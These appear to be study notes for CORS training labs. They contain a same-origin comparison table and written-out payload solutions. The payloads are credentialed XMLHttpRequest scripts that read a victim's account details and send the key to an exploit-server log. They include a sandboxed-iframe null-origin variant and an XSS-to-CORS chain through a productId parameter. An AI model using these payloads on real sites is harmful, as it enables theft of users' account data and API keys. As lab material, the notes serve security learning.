## General

| URL  |             Access permitted?              |
|:-----|:------------------------------------------:|
| http://normal-website.com/example/ |     Yes: same scheme, domain, and port     |
| http://normal-website.com/example2/|     Yes: same scheme, domain, and port     |
| https://normal-website.com/example/|       No: different scheme and port        |
| http://en.normal-website.com/example/|            No: different domain            |
| http://www.normal-website.com/example/ |            No: different domain            |
| http://normal-website.com:8080/example/ |     No: different port*   |
* Internet Explorer will allow this access because IE does not take account of the port number when applying the same-origin policy.

## LAB payloads

**Lab: CORS vulnerability with basic origin reflection**
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://...web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//exploit-...exploit-server.net/exploit?key='+this.responseText;
};
</script>

<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
**Lab: CORS vulnerability with trusted null origin**
--> login and find that there is script that fetch account details
--> notice that Origin: null is accepted and then reflected in response
--> find response from /accountDetails in json format
--> craft payload with sandbox (sandbox usage generates null origin)
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://...web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-...exploit-server.net//log?key='+this.responseText;
};
</script>"></iframe>
```

**Lab: CORS vulnerability with trusted insecure protocols**

--> find that key is retrieved via AJAX with ACAC
--> in repeater send request with header Origin: http://subdomain.lab-id 
--> find that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains (https + http)
--> find that **check stock** uses subdomain url
--> find that productID is vulnerable to XSS

```html
<script>
document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
--> notice that inside double quotes some chars must be encoded















